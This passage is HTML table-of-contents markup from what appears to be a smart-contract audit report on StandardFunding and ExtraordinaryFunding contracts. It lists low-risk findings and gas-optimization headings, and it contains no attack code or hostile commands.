<code>DISTRIBUTION_PERIOD_LENGTH</code>, <code>FUNDING_PERIOD_LENGTH</code>, AND <code>MAX_EFM_PROPOSAL_LENGTH</code> ARE HARDCODED BASED ON 7200 BLOCKS PER DAY</a></li>\n<li><a href=\"#02-ambiguity-in-standardfunding_standardproposalstate-function\">02 AMBIGUITY IN <code>StandardFunding._standardProposalState</code> FUNCTION</a></li>\n<li><a href=\"#03-extraordinaryfundingproposalvotesreceived-in-extraordinaryfunding-contract-is-uint120-instead-of-uint128\">03 <code>ExtraordinaryFundingProposal.votesReceived</code> IN <code>ExtraordinaryFunding</code> CONTRACT IS <code>uint120</code> INSTEAD OF <code>uint128</code></a></li>\n<li><a href=\"#04-calling-extraordinaryfundingproposeextraordinary-and-standardfundingproposestandard-functions-can-revert-and-waste-gas\">04 CALLING <code>ExtraordinaryFunding.proposeExtraordinary</code> AND <code>StandardFunding.proposeStandard</code> FUNCTIONS CAN REVERT AND WASTE GAS</a></li>\n<li><a href=\"#05-code-comment-in-extraordinaryfunding_extraordinaryproposalsucceeded-function-can-be-incorrect\">05 CODE COMMENT IN <code>ExtraordinaryFunding._extraordinaryProposalSucceeded</code> FUNCTION CAN BE INCORRECT</a></li>\n<li><a href=\"#06-code-comment-for-challenge_period_length-can-be-more-accurate\">06 CODE COMMENT FOR <code>CHALLENGE_PERIOD_LENGTH</code> CAN BE MORE ACCURATE</a></li>\n<li><a href=\"#07-setting-support-to-1-when-voteparams_votesused--0-is-false-in-standardfunding_fundingvote-function-is-redundant\">07 SETTING <code>support</code> TO <code>1</code> WHEN <code>voteParams_.votesUsed &#x3C; 0</code> IS FALSE IN <code>StandardFunding._fundingVote</code> FUNCTION IS REDUNDANT</a></li>\n<li><a href=\"#08-redundant-execution-of-if-sumofthesquareofvotescast--typeuint128max-revert-insufficientvotingpower-in-standardfunding_fundingvote-function\">08 REDUNDANT EXECUTION OF <code>if (sumOfTheSquareOfVotesCast > type(uint128).max) revert InsufficientVotingPower()</code> IN <code>StandardFunding._fundingVote</code> FUNCTION</a></li>\n<li><a href=\"#09-invalidvote-error-can-be-more-descriptive\">09 <code>InvalidVote</code> ERROR CAN BE MORE DESCRIPTIVE</a></li>\n<li><a href=\"#10-underscores-can-be-added-for-numbers\">10 UNDERSCORES CAN BE ADDED FOR NUMBERS</a></li>\n<li><a href=\"#11-uint256-can-be-used-instead-of-uint\">11 <code>uint256</code> CAN BE USED INSTEAD OF <code>uint</code></a></li>\n<li><a href=\"#12-spaces-can-be-added-for-better-readability\">12 SPACES CAN BE ADDED FOR BETTER READABILITY</a></li>\n<li><a href=\"#additional-low-risk-and-non-critical-issues\">Additional Low Risk and Non-Critical Issues</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#summary-1\">Summary</a></li>\n<li><a href=\"#gas-optimizations-1\">Gas Optimizations</a></li>\n<li><a href=\"#g-01-use-calldata-instead-of-memory-for-function-arguments-that-do-not-get-mutated\">G-01 Use calldata instead of memory for function arguments that do not get mutated</a></li>\n<li><a href=\"#g-02-state-variables-can-be-cached-instead-of-re-reading-them-from-storage\">G-02 State variables can be cached instead of re-reading them from storage</a></li>\n<li><a href=\"#g-03-refactor-internal-function-to-avoid-unnecessary-sload\">G-03 Refactor internal function to avoid unnecessary SLOAD</a></li>\n<li><a href=\"#g-04-using-storage-instead-of-memory-for-structsarrays-saves-gas\">G-04 Using storage instead of memory for structs/arrays saves gas</a></li>\n<li><a href=\"#g-05-avoid-emitting-storage-values\">G-05 Avoid emitting storage values</a></li>\n<li><a href=\"#g-06-multiple-accesses-of-a-mappingarray-should-use-a-storage-pointer\">G-06 Multiple accesses of a mapping/array should use a storage pointer</a></li>\n<li><a href=\"#g-07-multiple-address-mappings-can-be-combined-into-a-single-mapping-of-an-address-to-a-struct-where-appropriate\">G-07 Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate</a></li>\n<li><a href=\"#g-08-usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead\">G-08 Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead</a></li>\n<li><a href=\"#g-09-use-do-while-loops-instead-of-for-loops\">G-09 Use <code>do while</code> loops instead of <code>for</code> loops</a></li>\n<li><a href=\"#g-10-use-assembly-to-perform-efficient-back-to-back-calls\">G-10 Use assembly to perform efficient back-to-back calls</a></li>\n<li><a href=\"#g-11-refactor-event-to-avoid-emitting-data-that-is-already-present-in-transaction-data\">G-11 Refactor event to avoid emitting data that is already present in transaction data</a></li>\n<li><a href=\"#g-12-refactor-event-to-avoid-emitting-empty-data\">G-12 Refactor event to avoid emitting empty data</a></li>\n<li><a href=\"#g-13-sort-array-offchain-to-check-duplicates-in-on-instead-of-on2\">G-13 Sort array offchain to check duplicates in O(n) instead of O(n^2)</a></li>\n<li><a href=\"#gasreport-output-with-all-optimizations-applied\"><code>GasReport</code> output with all optimizations applied</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>"
}